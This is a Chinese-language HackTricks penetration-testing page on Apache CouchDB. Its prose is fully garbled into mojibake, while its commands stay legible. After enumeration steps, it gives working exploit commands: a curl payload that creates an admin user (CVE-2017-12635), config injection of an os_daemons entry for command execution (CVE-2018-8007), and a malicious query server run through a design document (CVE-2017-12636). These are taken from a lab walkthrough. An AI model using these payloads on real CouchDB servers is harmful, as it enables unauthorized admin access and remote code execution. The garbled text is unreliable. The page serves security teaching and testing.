# 5984,6984 - Pentesting CouchDB

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## **åŸºæœ¬ä¿¡æ¯**

**CouchDB**æ˜¯ä¸€ç§å¤šåŠŸèƒ½ä¸”å¼ºå¤§çš„**é¢å‘æ–‡æ¡£çš„æ•°æ®åº“**ï¼Œå®ƒä½¿ç”¨**é”®-å€¼æ˜ å°„**ç»“æ„åœ¨æ¯ä¸ª**æ–‡æ¡£**å†…ç»„ç»‡æ•°æ®ã€‚æ–‡æ¡£å†…çš„å­—æ®µå¯ä»¥è¡¨ç¤ºä¸º**é”®/å€¼å¯¹ã€åˆ—è¡¨æˆ–æ˜ å°„**ï¼Œæä¾›äº†æ•°æ®å­˜å‚¨å’Œæ£€ç´¢çš„çµæ´»æ€§ã€‚

åœ¨CouchDBä¸­ï¼Œæ¯ä¸ªå­˜å‚¨çš„**æ–‡æ¡£**éƒ½è¢«åˆ†é…ä¸€ä¸ªæ–‡æ¡£çº§åˆ«çš„**å”¯ä¸€æ ‡è¯†ç¬¦**(`_id`)ã€‚æ­¤å¤–ï¼Œå¯¹æ•°æ®åº“è¿›è¡Œçš„æ¯æ¬¡ä¿®æ”¹å¹¶ä¿å­˜éƒ½ä¼šè¢«åˆ†é…ä¸€ä¸ª**ä¿®è®¢å·**(`_rev`)ã€‚è¿™ä¸ªä¿®è®¢å·å…è®¸æœ‰æ•ˆåœ°**è·Ÿè¸ªå’Œç®¡ç†æ›´æ”¹**ï¼Œä¾¿äºåœ¨æ•°æ®åº“å†…è½»æ¾æ£€ç´¢å’ŒåŒæ­¥æ•°æ®ã€‚

**é»˜è®¤ç«¯å£ï¼š**5984ï¼ˆhttpï¼‰ï¼Œ6984ï¼ˆhttpsï¼‰
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **è‡ªåŠ¨æšä¸¾**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## æ‰‹åŠ¨æšä¸¾

### æ¨ªå¹…
```
curl http://IP:5984/
```
è¿™ä¼šå‘å·²å®‰è£…çš„CouchDBå®ä¾‹å‘å‡ºGETè¯·æ±‚ã€‚å›å¤åº”è¯¥ç±»ä¼¼äºä»¥ä¸‹å†…å®¹ä¹‹ä¸€ï¼š
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœè®¿é—®couchdbçš„æ ¹ç›®å½•æ”¶åˆ°`401 Unauthorized`ï¼Œç±»ä¼¼äºè¿™æ ·çš„æ¶ˆæ¯ï¼š`{"error":"unauthorized","reason":"Authentication required."}` **æ‚¨å°†æ— æ³•è®¿é—®**æ¨ªå¹…æˆ–ä»»ä½•å…¶ä»–ç«¯ç‚¹ã€‚
{% endhint %}

### ä¿¡æ¯æšä¸¾

ä»¥ä¸‹æ˜¯æ‚¨å¯ä»¥ä½¿ç”¨**GET**è¯·æ±‚è®¿é—®å¹¶æå–ä¸€äº›æœ‰è¶£ä¿¡æ¯çš„ç«¯ç‚¹ã€‚æ‚¨å¯ä»¥åœ¨[couchdbæ–‡æ¡£ä¸­æ‰¾åˆ°æ›´å¤šç«¯ç‚¹å’Œæ›´è¯¦ç»†çš„æè¿°](https://docs.couchdb.org/en/latest/api/index.html)ã€‚

- **`/_active_tasks`** æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡åˆ—è¡¨ï¼ŒåŒ…æ‹¬ä»»åŠ¡ç±»å‹ã€åç§°ã€çŠ¶æ€å’Œè¿›ç¨‹IDã€‚
- **`/_all_dbs`** è¿”å›CouchDBå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„åˆ—è¡¨ã€‚
- **`/_cluster_setup`** è¿”å›èŠ‚ç‚¹æˆ–é›†ç¾¤çš„çŠ¶æ€ï¼Œæ ¹æ®é›†ç¾¤è®¾ç½®å‘å¯¼ã€‚
- **`/_db_updates`** è¿”å›CouchDBå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“äº‹ä»¶çš„åˆ—è¡¨ã€‚éœ€è¦å­˜åœ¨`_global_changes`æ•°æ®åº“æ‰èƒ½ä½¿ç”¨æ­¤ç«¯ç‚¹ã€‚
- **`/_membership`** æ˜¾ç¤ºä½œä¸º`cluster_nodes`çš„é›†ç¾¤ä¸­çš„èŠ‚ç‚¹ã€‚å­—æ®µ`all_nodes`æ˜¾ç¤ºæ­¤èŠ‚ç‚¹çŸ¥é“çš„æ‰€æœ‰èŠ‚ç‚¹ï¼ŒåŒ…æ‹¬ä½œä¸ºé›†ç¾¤ä¸€éƒ¨åˆ†çš„èŠ‚ç‚¹ã€‚
- **`/_scheduler/jobs`** å¤åˆ¶ä½œä¸šåˆ—è¡¨ã€‚æ¯ä¸ªä½œä¸šæè¿°å°†åŒ…æ‹¬æºå’Œç›®æ ‡ä¿¡æ¯ã€å¤åˆ¶IDã€æœ€è¿‘äº‹ä»¶çš„å†å²è®°å½•ç­‰å…¶ä»–ä¿¡æ¯ã€‚
- **`/_scheduler/docs`** å¤åˆ¶æ–‡æ¡£çŠ¶æ€åˆ—è¡¨ã€‚åŒ…æ‹¬æ‰€æœ‰æ–‡æ¡£çš„ä¿¡æ¯ï¼Œç”šè‡³åœ¨`completed`å’Œ`failed`çŠ¶æ€ä¸‹ã€‚å¯¹äºæ¯ä¸ªæ–‡æ¡£ï¼Œå®ƒè¿”å›æ–‡æ¡£IDã€æ•°æ®åº“ã€å¤åˆ¶IDã€æºå’Œç›®æ ‡ç­‰ä¿¡æ¯ã€‚
- **`/_scheduler/docs/{replicator_db}`**
- **`/_scheduler/docs/{replicator_db}/{docid}`**
- **`/_node/{node-name}`** `/_node/{node-name}`ç«¯ç‚¹å¯ç”¨äºç¡®è®¤å¤„ç†è¯·æ±‚çš„æœåŠ¡å™¨çš„ErlangèŠ‚ç‚¹åç§°ã€‚åœ¨è®¿é—®`/_node/_local`ä»¥æ£€ç´¢æ­¤ä¿¡æ¯æ—¶ï¼Œè¿™æ˜¯æœ€æœ‰ç”¨çš„ã€‚
- **`/_node/{node-name}/_stats`** `_stats`èµ„æºè¿”å›åŒ…å«è¿è¡ŒæœåŠ¡å™¨ç»Ÿè®¡ä¿¡æ¯çš„JSONå¯¹è±¡ã€‚å­—é¢å­—ç¬¦ä¸²`_local`ç”¨ä½œæœ¬åœ°èŠ‚ç‚¹åç§°çš„åˆ«åï¼Œå› æ­¤å¯¹äºæ‰€æœ‰ç»Ÿè®¡URLï¼Œå¯ä»¥å°†`{node-name}`æ›¿æ¢ä¸º`_local`ï¼Œä»¥ä¸æœ¬åœ°èŠ‚ç‚¹çš„ç»Ÿè®¡ä¿¡æ¯äº¤äº’ã€‚
- **`/_node/{node-name}/_system`** `_system`èµ„æºè¿”å›åŒ…å«è¿è¡ŒæœåŠ¡å™¨å„ç§ç³»ç»Ÿçº§ç»Ÿè®¡ä¿¡æ¯çš„JSONå¯¹è±¡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨`_local`ä½œä¸º`{node-name}`æ¥è·å–å½“å‰èŠ‚ç‚¹ä¿¡æ¯ã€‚
- **`/_node/{node-name}/_restart`**
- **`/_up`** ç¡®è®¤æœåŠ¡å™¨æ­£åœ¨è¿è¡Œå¹¶å‡†å¤‡å¥½å“åº”è¯·æ±‚ã€‚å¦‚æœ[`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance_mode)ä¸º`true`æˆ–`nolb`ï¼Œç«¯ç‚¹å°†è¿”å›404å“åº”ã€‚
- **`/_uuids`** ä»CouchDBå®ä¾‹è¯·æ±‚ä¸€ä¸ªæˆ–å¤šä¸ªé€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆUUIDsï¼‰ã€‚
- **`/_reshard`** è¿”å›å·²å®Œæˆã€å¤±è´¥ã€è¿è¡Œã€åœæ­¢å’Œæ€»ä½œä¸šè®¡æ•°ä»¥åŠé›†ç¾¤ä¸ŠreshardingçŠ¶æ€ã€‚

å¯ä»¥æå–æ›´å¤šæœ‰è¶£ä¿¡æ¯ï¼Œå¦‚æ­¤å¤„æ‰€è¿°ï¼š[https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **æ•°æ®åº“åˆ—è¡¨**
```
curl -X GET http://IP:5984/_all_dbs
```
å¦‚æœè¯¥è¯·æ±‚ä»¥401æœªç»æˆæƒçš„æ–¹å¼å›åº”ï¼Œåˆ™æ‚¨éœ€è¦ä¸€äº›æœ‰æ•ˆçš„å‡­æ®æ¥è®¿é—®æ•°æ®åº“ï¼š
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
ä¸ºäº†æ‰¾åˆ°æœ‰æ•ˆçš„å‡­è¯ï¼Œæ‚¨å¯ä»¥**å°è¯•**[**æš´åŠ›ç ´è§£æœåŠ¡**](../generic-methodologies-and-resources/brute-force.md#couchdb)ã€‚

è¿™æ˜¯ä¸€ä¸ªcouchdbçš„**å“åº”ç¤ºä¾‹**ï¼Œå½“æ‚¨æœ‰**è¶³å¤Ÿçš„æƒé™**æ¥åˆ—å‡ºæ•°æ®åº“æ—¶ï¼ˆè¿™åªæ˜¯ä¸€ä¸ªæ•°æ®åº“åˆ—è¡¨ï¼‰ï¼š
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### æ•°æ®åº“ä¿¡æ¯

æ‚¨å¯ä»¥è®¿é—®æ•°æ®åº“åç§°æ¥è·å–ä¸€äº›æ•°æ®åº“ä¿¡æ¯ï¼ˆå¦‚æ–‡ä»¶æ•°é‡å’Œå¤§å°ï¼‰ï¼š
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **æ–‡æ¡£åˆ—è¡¨**

åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ¯ä¸ªæ¡ç›®
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **è¯»å–æ–‡æ¡£**

è¯»å–æ•°æ®åº“ä¸­æ–‡æ¡£çš„å†…å®¹ï¼š
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDBç‰¹æƒæå‡ [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

ç”±äºErlangå’ŒJavaScript JSONè§£æå™¨ä¹‹é—´çš„å·®å¼‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯·æ±‚**åˆ›å»ºä¸€ä¸ªå…·æœ‰å‡­æ®`hacktricks:hacktricks`çš„ç®¡ç†å‘˜ç”¨æˆ·**ï¼š
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**æœ‰å…³æ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯è¯·ç‚¹å‡»æ­¤å¤„**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### **Erlang Cookie å®‰å…¨æ¦‚è¿°**

ç¤ºä¾‹[åœ¨è¿™é‡Œ](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

åœ¨CouchDBæ–‡æ¡£ä¸­ï¼Œç‰¹åˆ«æ˜¯åœ¨æœ‰å…³é›†ç¾¤è®¾ç½®çš„éƒ¨åˆ†([é“¾æ¥](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup))ï¼Œè®¨è®ºäº†CouchDBåœ¨é›†ç¾¤æ¨¡å¼ä¸‹ä½¿ç”¨çš„ç«¯å£ã€‚æ–‡æ¡£æåˆ°ï¼Œä¸ç‹¬ç«‹æ¨¡å¼ä¸€æ ·ï¼Œç«¯å£`5984`è¢«ä½¿ç”¨ã€‚æ­¤å¤–ï¼Œç«¯å£`5986`ç”¨äºèŠ‚ç‚¹æœ¬åœ°APIï¼Œè€Œé‡è¦çš„æ˜¯ï¼ŒErlangéœ€è¦TCPç«¯å£`4369`ç”¨äºErlang Port Mapper Daemon (EPMD)ï¼Œä¿ƒè¿›Erlangé›†ç¾¤å†…çš„èŠ‚ç‚¹é€šä¿¡ã€‚è¿™ç§è®¾ç½®å½¢æˆäº†ä¸€ä¸ªç½‘ç»œï¼Œå…¶ä¸­æ¯ä¸ªèŠ‚ç‚¹ä¸å…¶ä»–æ¯ä¸ªèŠ‚ç‚¹éƒ½ç›¸äº’é“¾æ¥ã€‚

å…³äºç«¯å£`4369`çªå‡ºäº†ä¸€ä¸ªå…³é”®çš„å®‰å…¨è­¦æŠ¥ã€‚å¦‚æœæ­¤ç«¯å£åœ¨äº’è”ç½‘æˆ–ä»»ä½•ä¸å—ä¿¡ä»»çš„ç½‘ç»œä¸Šå¯è®¿é—®ï¼Œç³»ç»Ÿçš„å®‰å…¨æ€§å°†ä¸¥é‡ä¾èµ–äºä¸€ä¸ªç§°ä¸º"cookie"çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚è¿™ä¸ªcookieå……å½“äº†ä¸€ä¸ªä¿æŠ¤æªæ–½ã€‚ä¾‹å¦‚ï¼Œåœ¨ç»™å®šçš„è¿›ç¨‹åˆ—è¡¨ä¸­ï¼Œå¯èƒ½ä¼šè§‚å¯Ÿåˆ°åä¸º"monster"çš„cookieï¼Œè¡¨æ˜å…¶åœ¨ç³»ç»Ÿå®‰å…¨æ¡†æ¶ä¸­çš„æ“ä½œè§’è‰²ã€‚
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
å¯¹äºé‚£äº›æƒ³è¦äº†è§£å¦‚ä½•åœ¨ Erlang ç³»ç»Ÿä¸­åˆ©ç”¨è¿™ä¸ª "cookie" å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰çš„äººï¼Œå¯ä»¥é˜…è¯»ä¸“é—¨çš„ç« èŠ‚ã€‚è¯¥ç« èŠ‚è¯¦ç»†ä»‹ç»äº†åˆ©ç”¨ Erlang cookie ä»¥æœªç»æˆæƒçš„æ–¹å¼æ§åˆ¶ç³»ç»Ÿçš„æ–¹æ³•ã€‚æ‚¨å¯ä»¥**[åœ¨è¿™é‡ŒæŸ¥çœ‹æœ‰å…³æ»¥ç”¨ Erlang cookie å®ç° RCE çš„è¯¦ç»†æŒ‡å—](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**ã€‚

### **é€šè¿‡ä¿®æ”¹ local.ini åˆ©ç”¨ CVE-2018-8007**

ç¤ºä¾‹[åœ¨è¿™é‡Œ](https://0xdf.gitlab.io/2018/09/15/htb-canape.html)ã€‚

æœ€è¿‘æŠ«éœ²çš„æ¼æ´ CVE-2018-8007 å½±å“äº† Apache CouchDBï¼Œæ­ç¤ºäº†åˆ©ç”¨è¯¥æ¼æ´éœ€è¦å¯¹ `local.ini` æ–‡ä»¶å…·æœ‰å†™å…¥æƒé™ã€‚å°½ç®¡ç”±äºå®‰å…¨é™åˆ¶ï¼Œè¿™å¹¶ä¸ç›´æ¥é€‚ç”¨äºåˆå§‹ç›®æ ‡ç³»ç»Ÿï¼Œä½†ä¸ºäº†æ¢ç´¢ç›®çš„ï¼Œå¯¹ `local.ini` æ–‡ä»¶è¿›è¡Œäº†ä¿®æ”¹ä»¥æˆäºˆå†™å…¥è®¿é—®æƒé™ã€‚ä¸‹é¢æä¾›äº†è¯¦ç»†çš„æ­¥éª¤å’Œä»£ç ç¤ºä¾‹ï¼Œæ¼”ç¤ºäº†è¯¥è¿‡ç¨‹ã€‚

é¦–å…ˆï¼Œé€šè¿‡ç¡®ä¿ `local.ini` æ–‡ä»¶å¯å†™æ¥å‡†å¤‡ç¯å¢ƒï¼Œå¹¶é€šè¿‡åˆ—å‡ºæƒé™è¿›è¡ŒéªŒè¯ï¼š
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ‰§è¡Œä¸€ä¸ªcurlå‘½ä»¤ï¼Œé’ˆå¯¹`local.ini`ä¸­çš„`cors/origins`é…ç½®ã€‚è¿™ä¼šåœ¨`[os_daemons]`éƒ¨åˆ†æ³¨å…¥ä¸€ä¸ªæ–°çš„originä»¥åŠé¢å¤–çš„å‘½ä»¤ï¼Œæ—¨åœ¨æ‰§è¡Œä»»æ„ä»£ç ï¼š
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
éšåçš„éªŒè¯æ˜¾ç¤ºåœ¨ `local.ini` ä¸­æ³¨å…¥çš„é…ç½®ï¼Œå°†å…¶ä¸å¤‡ä»½è¿›è¡Œå¯¹æ¯”ä»¥çªå‡ºæ˜¾ç¤ºæ›´æ”¹ï¼š
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
æœ€åˆï¼Œé¢„æœŸçš„æ–‡ä»¶(`/tmp/0xdf`)ä¸å­˜åœ¨ï¼Œè¡¨æ˜æ³¨å…¥çš„å‘½ä»¤å°šæœªæ‰§è¡Œã€‚è¿›ä¸€æ­¥è°ƒæŸ¥å‘ç°ï¼Œä¸CouchDB ç›¸å…³çš„è¿›ç¨‹æ­£åœ¨è¿è¡Œï¼Œå…¶ä¸­ä¸€ä¸ªå¯èƒ½ä¼šæ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤ï¼š
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
é€šè¿‡ç»ˆæ­¢å·²è¯†åˆ«çš„CouchDBè¿›ç¨‹å¹¶å…è®¸ç³»ç»Ÿè‡ªåŠ¨é‡æ–°å¯åŠ¨ï¼Œè§¦å‘äº†æ³¨å…¥å‘½ä»¤çš„æ‰§è¡Œï¼Œé€šè¿‡ä¹‹å‰ä¸¢å¤±çš„æ–‡ä»¶çš„å­˜åœ¨å¾—åˆ°ç¡®è®¤ï¼š
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
è¿™é¡¹æ¢ç´¢ç¡®è®¤äº†åœ¨ç‰¹å®šæ¡ä»¶ä¸‹åˆ©ç”¨CVE-2018-8007çš„å¯è¡Œæ€§ï¼Œç‰¹åˆ«æ˜¯éœ€è¦å¯¹`local.ini`æ–‡ä»¶å…·æœ‰å¯å†™è®¿é—®æƒé™ã€‚æä¾›çš„ä»£ç ç¤ºä¾‹å’Œæ“ä½œæ­¥éª¤ä¸ºåœ¨å—æ§ç¯å¢ƒä¸­å¤åˆ¶åˆ©ç”¨æ¼æ´æä¾›äº†æ¸…æ™°æŒ‡å—ã€‚

æœ‰å…³CVE-2018-8007çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚è€ƒmdsecå‘å¸ƒçš„å…¬å‘Šï¼š[CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/)ã€‚

### **ä½¿ç”¨local.iniå†™æƒé™æ¢ç´¢CVE-2017-12636**

ç¤ºä¾‹[åœ¨è¿™é‡Œ](https://0xdf.gitlab.io/2018/09/15/htb-canape.html)ã€‚

æ¢è®¨äº†ä¸€ç§åä¸ºCVE-2017-12636çš„æ¼æ´ï¼Œå®ƒé€šè¿‡CouchDBè¿›ç¨‹å®ç°ä»£ç æ‰§è¡Œï¼Œå°½ç®¡ç‰¹å®šé…ç½®å¯èƒ½ä¼šé˜»æ­¢å…¶åˆ©ç”¨ã€‚å°½ç®¡åœ¨çº¿ä¸Šæœ‰è®¸å¤šå¯ç”¨çš„æ¦‚å¿µéªŒè¯ï¼ˆPOCï¼‰å‚è€ƒï¼Œä½†éœ€è¦è°ƒæ•´æ‰èƒ½åˆ©ç”¨CouchDBç‰ˆæœ¬2ä¸Šçš„æ¼æ´ï¼Œä¸é€šå¸¸è¢«ç„å‡†çš„ç‰ˆæœ¬1.xä¸åŒã€‚åˆå§‹æ­¥éª¤æ¶‰åŠéªŒè¯CouchDBç‰ˆæœ¬å¹¶ç¡®è®¤é¢„æœŸçš„æŸ¥è¯¢æœåŠ¡å™¨è·¯å¾„ä¸å­˜åœ¨ã€‚
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
ä¸ºäº†é€‚åº”CouchDB 2.0ç‰ˆæœ¬ï¼Œä½¿ç”¨äº†æ–°çš„è·¯å¾„ï¼š
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
å°è¯•æ·»åŠ å’Œè°ƒç”¨æ–°çš„æŸ¥è¯¢æœåŠ¡å™¨æ—¶é‡åˆ°äº†ä¸æƒé™ç›¸å…³çš„é”™è¯¯ï¼Œå¦‚ä¸‹è¾“å‡ºæ‰€ç¤ºï¼š
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
è¿›ä¸€æ­¥è°ƒæŸ¥å‘ç°`local.ini`æ–‡ä»¶å­˜åœ¨æƒé™é—®é¢˜ï¼Œæ— æ³•å†™å…¥ã€‚é€šè¿‡ä½¿ç”¨rootæˆ–homerè®¿é—®æƒé™ä¿®æ”¹æ–‡ä»¶æƒé™ï¼Œå°±å¯ä»¥ç»§ç»­è¿›è¡Œï¼š
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
éšåå°è¯•æ·»åŠ æŸ¥è¯¢æœåŠ¡å™¨æˆåŠŸï¼Œå“åº”ä¸­æ²¡æœ‰é”™è¯¯æ¶ˆæ¯ã€‚é€šè¿‡æ–‡ä»¶æ¯”è¾ƒç¡®è®¤æˆåŠŸä¿®æ”¹äº† `local.ini` æ–‡ä»¶ï¼š
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
æ¥ä¸‹æ¥çš„è¿‡ç¨‹åŒ…æ‹¬åˆ›å»ºä¸€ä¸ªæ•°æ®åº“å’Œä¸€ä¸ªæ–‡æ¡£ï¼Œç„¶åå°è¯•é€šè¿‡è‡ªå®šä¹‰è§†å›¾æ˜ å°„åˆ°æ–°æ·»åŠ çš„æŸ¥è¯¢æœåŠ¡å™¨æ¥æ‰§è¡Œä»£ç ï¼š
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
ä¸€ä¸ª**[æ‘˜è¦](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)**å’Œä¸€ä¸ªæ›¿ä»£æœ‰æ•ˆè½½è·æä¾›äº†åœ¨ç‰¹å®šæ¡ä»¶ä¸‹åˆ©ç”¨CVE-2017-12636çš„æ›´å¤šè§è§£ã€‚åˆ©ç”¨æ­¤æ¼æ´çš„**æœ‰ç”¨èµ„æº**åŒ…æ‹¬ï¼š

- [POCåˆ©ç”¨ä»£ç ](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [Exploit Databaseæ¡ç›®](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## å‚è€ƒèµ„æ–™

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
